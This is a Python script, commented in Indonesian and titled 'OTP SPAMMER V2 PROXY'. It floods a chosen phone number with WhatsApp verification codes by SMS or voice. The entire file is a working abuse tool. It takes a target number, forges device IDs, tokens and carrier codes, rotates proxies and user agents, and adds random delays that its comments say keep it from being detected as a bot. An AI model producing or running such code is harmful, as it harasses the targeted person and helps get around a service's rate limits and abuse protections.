import requests
import random
import time
import string

TARGET = input("Nomor target (62xxx): ")
JUMLAH = int(input("Jumlah spam: "))

# LOAD PROXY LIST (ISI DENGAN PROXY FRESH!)
PROXIES = [
    {"http": "http://proxy1:port", "https": "http://proxy1:port"},
    {"http": "http://proxy2:port", "https": "http://proxy2:port"},
    # TAMBAH LEBIH BANYAK PROXY!
]

def gen_device_id():
    return ''.join(random.choices(string.hexdigits.lower(), k=16))

def gen_token():
    chars = string.ascii_letters + string.digits
    return ''.join(random.choices(chars, k=32))

HEADERS_BASE = {
    "Accept": "application/json, text/plain, */*",
    "Accept-Language": "id-ID,id;q=0.9",
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "",
}

USER_AGENTS = [
    "Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 Chrome/118.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; CPH2239) AppleWebKit/537.36 Chrome/117.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 7 Pro) AppleWebKit/537.36 Chrome/119.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; Redmi Note 10) AppleWebKit/537.36 Chrome/116.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
]

URL_LIST = [
    "https://v.whatsapp.com/v2/register",
    "https://v.whatsapp.com/v2/code",
]

print(f"""
╔══════════════════════════════════════╗
║   💀 OTP SPAMMER V2 PROXY 💀       ║
║   Target: {TARGET}                    ║
╚══════════════════════════════════════╝
""")

sukses = 0
gagal = 0

for i in range(JUMLAH):
    try:
        proxy = random.choice(PROXIES) if PROXIES else None
        ua = random.choice(USER_AGENTS)
        url = random.choice(URL_LIST)
        device_id = gen_device_id()
        token = gen_token()
        
        HEADERS_BASE["User-Agent"] = ua
        
        DATA = {
            "cc": "62",
            "in": TARGET,
            "to": TARGET,
            "lc": "ID",
            "lg": "id",
            "mcc": "510",
            "mnc": random.choice(["001","008","089","010"]),
            "sim_mcc": "510",
            "sim_mnc": random.choice(["001","008","089","010"]),
            "method": random.choice(["sms", "voice"]),
            "id": device_id,
            "token": token,
            "vname": f"device_{device_id[:8]}",
        }
        
        resp = requests.post(
            url,
            headers=HEADERS_BASE,
            data=DATA,
            proxies=proxy,
            timeout=15
        )
        
        if "ok" in resp.text.lower() or "sent" in resp.text.lower():
            sukses += 1
            print(f"[{i+1}] ✅ BERHASIL | Proxy: {proxy['http'] if proxy else 'DIRECT'} | Method: {DATA['method']}")
        elif "wait" in resp.text.lower() or "too_many" in resp.text.lower():
            print(f"[{i+1}] ⏳ RATE LIMIT -> GANTI PROXY/IP")
            time.sleep(30)
        elif "blocked" in resp.text.lower():
            print(f"[{i+1}] 🚫 PROXY KENA BLOKIR -> SKIP")
            continue
        else:
            gagal += 1
            print(f"[{i+1}] ❌ GAGAL | Status: {resp.status_code}")
        
        # DELAY ACAK BIAR GA KETAUAN BOT
        time.sleep(random.randint(15, 45))
        
    except Exception as e:
        gagal += 1
        print(f"[{i+1}] ⚠️ ERROR: {str(e)[:50]}")
        time.sleep(10)

print(f"""
╔══════════════════════════════════════╗
║   HASIL: ✅{sukses} BERHASIL | ❌{gagal} GAGAL    ║
╚══════════════════════════════════════╝
""")
